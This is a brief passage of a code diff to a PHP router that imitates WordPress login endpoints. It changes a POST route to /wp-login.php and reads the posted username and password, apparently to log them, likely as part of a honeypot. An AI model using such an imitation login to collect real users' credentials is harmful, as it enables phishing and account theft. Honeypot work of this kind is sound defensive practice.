@@ -1082,7 +1082,7 @@ $router->get('/wp-login.php', function() {
     echo $output;
 });
 
-$router->post('/wp-admin/', function() {
+$router->post('/wp-login.php', function() {
    $name = $_POST["log"];
    $pass = $_POST["pwd"];
    $log_m = 
